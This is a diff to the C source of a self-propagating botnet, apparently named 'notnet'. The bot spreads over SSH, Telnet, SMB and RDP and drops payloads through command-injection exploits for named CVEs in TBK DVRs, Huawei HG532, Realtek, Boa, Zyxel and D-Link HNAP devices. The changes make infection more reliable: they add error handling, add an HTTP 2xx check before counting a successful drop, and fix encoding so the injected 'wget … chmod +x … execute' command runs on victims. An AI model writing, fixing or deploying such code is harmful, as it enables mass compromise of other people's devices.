@@ -384,8 +384,18 @@ int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
                 /* Download and install binary */
                 char cmd[1024];
                 char dl_url[1024];
-                /* #190: one-time download token instead of the fleet secret. */
-                build_drop_url(bot, dl_url, sizeof(dl_url));
+                /* #190/#312: one-time download token instead of the fleet
+                 * secret. Check the result: on hard failure dl_url is left
+                 * empty/truncated, so skip the drop rather than fire a
+                 * broken command at the victim; log the fallback path. */
+                int durl_rc = build_drop_url(bot, dl_url, sizeof(dl_url));
+                if (durl_rc < 0) {
+                    log_error("SSH: cannot build payload URL for %s, drop skipped", ip);
+                    close(sock_fd);
+                    return -1;
+                }
+                if (durl_rc > 0)
+                    log_warn("SSH: using legacy ?secret= drop URL for %s", ip);
                 /* %.500s: dl_url is capped at ~330 bytes (base URL + token),
                  * but GCC can't see through the intermediate buffer, so cap
                  * again to silence truncation. */
@@ -660,8 +670,16 @@ int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
                 
                 char cmd[512];
                 char dl_url[512];
-                /* #190: one-time download token instead of the fleet secret. */
-                build_drop_url(bot, dl_url, sizeof(dl_url));
+                /* #190/#312: check the result — hard failure leaves dl_url
+                 * truncated/empty, so skip the drop entirely (#312). */
+                int durl_rc = build_drop_url(bot, dl_url, sizeof(dl_url));
+                if (durl_rc < 0) {
+                    log_error("Telnet: cannot build payload URL for %s, drop skipped", ip);
+                    close(sock_fd);
+                    return -1;
+                }
+                if (durl_rc > 0)
+                    log_warn("Telnet: using legacy ?secret= drop URL for %s", ip);
                 snprintf(cmd, sizeof(cmd),
                     "wget %.430s -O /tmp/.notnet; chmod +x /tmp/.notnet; nohup /tmp/.notnet &",
                     dl_url);
@@ -1015,8 +1033,15 @@ static int smb_deploy_payload(int sock, uint16_t tid, uint16_t uid, uint16_t mid
     /* Download payload to temp file */
     char dl_url[512];
     char tmp_path[256];
-    /* #190: one-time download token instead of the fleet secret. */
-    build_drop_url(bot, dl_url, sizeof(dl_url));
+    /* #190/#312: check the result — hard failure leaves dl_url truncated,
+     * so abort the deploy instead of fetching a broken URL (#312). */
+    int durl_rc = build_drop_url(bot, dl_url, sizeof(dl_url));
+    if (durl_rc < 0) {
+        log_error("SMB: cannot build payload URL for %s, deploy skipped", ip);
+        return -1;
+    }
+    if (durl_rc > 0)
+        log_warn("SMB: using legacy ?secret= drop URL for %s", ip);
     snprintf(tmp_path, sizeof(tmp_path), "/tmp/.notnet_smb.%s", ip);
 
     int fsize = http_download(bot, dl_url, tmp_path);
@@ -1843,8 +1868,16 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
              * -Wformat-truncation analysis on the 512-byte array. */
             char cmd[512];
             char dl_url[512];
-            /* #190: one-time download token instead of the fleet secret. */
-            build_drop_url(bot, dl_url, sizeof(dl_url));
+            /* #190/#312: check the result — hard failure leaves dl_url
+             * truncated/empty, so skip the drop entirely (#312). */
+            int durl_rc = build_drop_url(bot, dl_url, sizeof(dl_url));
+            if (durl_rc < 0) {
+                log_error("RDP: cannot build payload URL for %s, drop skipped", ip);
+                close(sock);
+                return -1;
+            }
+            if (durl_rc > 0)
+                log_warn("RDP: using legacy ?secret= drop URL for %s", ip);
 
             snprintf(cmd, sizeof(cmd),
                      "cmd.exe /c wget \"%.430s\" -O C:\\Windows\\Temp\\notnet.exe && C:\\Windows\\Temp\\notnet.exe &",
@@ -1984,6 +2017,21 @@ static int cve_contains_ci(const char *haystack, const char *needle) {
     return 0;
 }
 
+/* #256: honest drop-success evidence. A payload drop only counts when the
+ * device answered with an HTTP 2xx status line — anything else (404/500,
+ * a refusal page, non-HTTP garbage) means the exploit request was not
+ * accepted and the payload never landed. Returns 1 only on 2xx. */
+static int cve_drop_accepted(const char *resp) {
+    if (!resp || strncmp(resp, "HTTP/", 5) != 0) return 0;
+    const char *p = resp + 5;            /* skip "HTTP/" */
+    while (*p && *p != ' ') p++;         /* skip version */
+    if (*p != ' ') return 0;
+    p++;                                 /* status code */
+    if (p[0] != '2' || p[1] < '0' || p[1] > '9' || p[2] < '0' || p[2] > '9')
+        return 0;
+    return 1;
+}
+
 /* ── CVE-2024-3721 — TBK DVR-4104/DVR-4216 ───────────────── */
 /* Unauthenticated OS command injection via a crafted POST to
  * /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=<cmd>
@@ -2027,8 +2075,15 @@ static int cve_tbk_verify(const char *ip, uint16_t port) {
 
 static int cve_tbk_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     char dl_url[512];
-    /* #190: one-time download token instead of the fleet secret. */
-    build_drop_url(bot, dl_url, sizeof(dl_url));
+    /* #190/#312/#256: one-time download token; propagate hard failure
+     * so a truncated URL can never become a phantom hit. */
+    int durl_rc = build_drop_url(bot, dl_url, sizeof(dl_url));
+    if (durl_rc < 0) {
+        log_error("CVE-2024-3721: cannot build payload URL for %s, drop skipped", ip);
+        return -1;
+    }
+    if (durl_rc > 0)
+        log_warn("CVE-2024-3721: using legacy ?secret= drop URL for %s", ip);
     /* BusyBox wget; ';' separators keep the injected line single. */
     char cmd[1024];
     snprintf(cmd, sizeof(cmd),
@@ -2049,6 +2104,12 @@ static int cve_tbk_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
     if (n <= 0) {
         log_warn("CVE-2024-3721: drop exchange failed on %s", ip);
+        return -1;
+    }
+    /* #256: any-bytes-back is not success — require an HTTP 2xx
+     * status line before counting this drop. */
+    if (!cve_drop_accepted(resp)) {
+        log_warn("CVE-2024-3721: device %s:%d refused the drop (non-2xx response)", ip, port);
         return -1;
     }
     log_info("CVE-2024-3721: payload dropped on %s:%d", ip, port);
@@ -2123,8 +2184,15 @@ static int cve_hg532_verify(const char *ip, uint16_t port) {
 
 static int cve_hg532_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     char dl_url[512];
-    /* #190: one-time download token instead of the fleet secret. */
-    build_drop_url(bot, dl_url, sizeof(dl_url));
+    /* #190/#312/#256: one-time download token; propagate hard failure
+     * so a truncated URL can never become a phantom hit. */
+    int durl_rc = build_drop_url(bot, dl_url, sizeof(dl_url));
+    if (durl_rc < 0) {
+        log_error("CVE-2017-17215: cannot build payload URL for %s, drop skipped", ip);
+        return -1;
+    }
+    if (durl_rc > 0)
+        log_warn("CVE-2017-17215: using legacy ?secret= drop URL for %s", ip);
     char cmd[1024];
     snprintf(cmd, sizeof(cmd),
              "wget %.500s -O /tmp/.notnet; chmod +x /tmp/.notnet; /tmp/.notnet",
@@ -2151,6 +2219,12 @@ static int cve_hg532_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
     if (n <= 0) {
         log_warn("CVE-2017-17215: drop exchange failed on %s", ip);
+        return -1;
+    }
+    /* #256: any-bytes-back is not success — require an HTTP 2xx
+     * status line before counting this drop. */
+    if (!cve_drop_accepted(resp)) {
+        log_warn("CVE-2017-17215: device %s:%d refused the drop (non-2xx response)", ip, port);
         return -1;
     }
     log_info("CVE-2017-17215: payload dropped on %s:%d", ip, port);
@@ -2200,13 +2274,22 @@ static int cve_realtek_verify(const char *ip, uint16_t port) {
 
 static int cve_realtek_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     char dl_url[512];
-    /* #190: one-time download token instead of the fleet secret. */
-    build_drop_url(bot, dl_url, sizeof(dl_url));
+    /* #190/#312/#256: one-time download token; propagate hard failure
+     * so a truncated URL can never become a phantom hit. */
+    int durl_rc = build_drop_url(bot, dl_url, sizeof(dl_url));
+    if (durl_rc < 0) {
+        log_error("CVE-2021-35395: cannot build payload URL for %s, drop skipped", ip);
+        return -1;
+    }
+    if (durl_rc > 0)
+        log_warn("CVE-2021-35395: using legacy ?secret= drop URL for %s", ip);
     /* '+' is the form-encoded space; ';' separates the shell steps and
-     * the raw URL contains no '&', so the value cannot split params. */
+     * the raw URL contains no '&', so the value cannot split params.
+     * The literal '+' of chmod +x must ride as %2B (#310): a bare '+'
+     * decodes to a space, giving mode 'x' instead of '+x'. */
     char body[1536];
     snprintf(body, sizeof(body),
-             "sysCmd=wget+%.500s+-O+/tmp/.notnet;chmod++x+/tmp/.notnet;/tmp/.notnet",
+             "sysCmd=wget+%.500s+-O+/tmp/.notnet;chmod+%2Bx+/tmp/.notnet;/tmp/.notnet",
              dl_url);
     char req[2048];
     snprintf(req, sizeof(req),
@@ -2218,6 +2301,12 @@ static int cve_realtek_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
     if (n <= 0) {
         log_warn("CVE-2021-35395: drop exchange failed on %s", ip);
+        return -1;
+    }
+    /* #256: any-bytes-back is not success — require an HTTP 2xx
+     * status line before counting this drop. */
+    if (!cve_drop_accepted(resp)) {
+        log_warn("CVE-2021-35395: device %s:%d refused the drop (non-2xx response)", ip, port);
         return -1;
     }
     log_info("CVE-2021-35395: payload dropped on %s:%d", ip, port);
@@ -2269,8 +2358,15 @@ static int cve_boa_verify(const char *ip, uint16_t port) {
 
 static int cve_boa_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     char dl_url[512];
-    /* #190: one-time download token instead of the fleet secret. */
-    build_drop_url(bot, dl_url, sizeof(dl_url));
+    /* #190/#312/#256: one-time download token; propagate hard failure
+     * so a truncated URL can never become a phantom hit. */
+    int durl_rc = build_drop_url(bot, dl_url, sizeof(dl_url));
+    if (durl_rc < 0) {
+        log_error("CVE-2018-10088: cannot build payload URL for %s, drop skipped", ip);
+        return -1;
+    }
+    if (durl_rc > 0)
+        log_warn("CVE-2018-10088: using legacy ?secret= drop URL for %s", ip);
     /* The whole wget line rides the cmd= value percent-encoded, so no
      * shell character can split form parameters or truncate the line. */
     char cmd[1024];
@@ -2295,6 +2391,12 @@ static int cve_boa_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
     if (n <= 0) {
         log_warn("CVE-2018-10088: drop exchange failed on %s", ip);
+        return -1;
+    }
+    /* #256: any-bytes-back is not success — require an HTTP 2xx
+     * status line before counting this drop. */
+    if (!cve_drop_accepted(resp)) {
+        log_warn("CVE-2018-10088: device %s:%d refused the drop (non-2xx response)", ip, port);
         return -1;
     }
     log_info("CVE-2018-10088: payload dropped on %s:%d", ip, port);
@@ -2344,8 +2446,15 @@ static int cve_zyxel_verify(const char *ip, uint16_t port) {
 
 static int cve_zyxel_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     char dl_url[512];
-    /* #190: one-time download token instead of the fleet secret. */
-    build_drop_url(bot, dl_url, sizeof(dl_url));
+    /* #190/#312/#256: one-time download token; propagate hard failure
+     * so a truncated URL can never become a phantom hit. */
+    int durl_rc = build_drop_url(bot, dl_url, sizeof(dl_url));
+    if (durl_rc < 0) {
+        log_error("CVE-2020-29583: cannot build payload URL for %s, drop skipped", ip);
+        return -1;
+    }
+    if (durl_rc > 0)
+        log_warn("CVE-2020-29583: using legacy ?secret= drop URL for %s", ip);
     /* The wget line uses no '&' or '<'/'>', so no parameter splitting;
      * spaces travel as %20 inside the zysh command value. */
     char cmd[768];
@@ -2369,6 +2478,12 @@ static int cve_zyxel_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
     if (n <= 0) {
         log_warn("CVE-2020-29583: drop exchange failed on %s", ip);
+        return -1;
+    }
+    /* #256: any-bytes-back is not success — require an HTTP 2xx
+     * status line before counting this drop. */
+    if (!cve_drop_accepted(resp)) {
+        log_warn("CVE-2020-29583: device %s:%d refused the drop (non-2xx response)", ip, port);
         return -1;
     }
     log_info("CVE-2020-29583: payload dropped on %s:%d", ip, port);
@@ -2418,8 +2533,15 @@ static int cve_hnap_verify(const char *ip, uint16_t port) {
 
 static int cve_hnap_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     char dl_url[512];
-    /* #190: one-time download token instead of the fleet secret. */
-    build_drop_url(bot, dl_url, sizeof(dl_url));
+    /* #190/#312/#256: one-time download token; propagate hard failure
+     * so a truncated URL can never become a phantom hit. */
+    int durl_rc = build_drop_url(bot, dl_url, sizeof(dl_url));
+    if (durl_rc < 0) {
+        log_error("CVE-2015-2051: cannot build payload URL for %s, drop skipped", ip);
+        return -1;
+    }
+    if (durl_rc > 0)
+        log_warn("CVE-2015-2051: using legacy ?secret= drop URL for %s", ip);
     /* Backticks carry the wget line; no quotes/'&' inside, so the
      * header stays a single SOAPAction value. */
     char req[1024];
@@ -2434,6 +2556,12 @@ static int cve_hnap_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
     if (n <= 0) {
         log_warn("CVE-2015-2051: drop exchange failed on %s", ip);
+        return -1;
+    }
+    /* #256: any-bytes-back is not success — require an HTTP 2xx
+     * status line before counting this drop. */
+    if (!cve_drop_accepted(resp)) {
+        log_warn("CVE-2015-2051: device %s:%d refused the drop (non-2xx response)", ip, port);
         return -1;
     }
     log_info("CVE-2015-2051: payload dropped on %s:%d", ip, port);
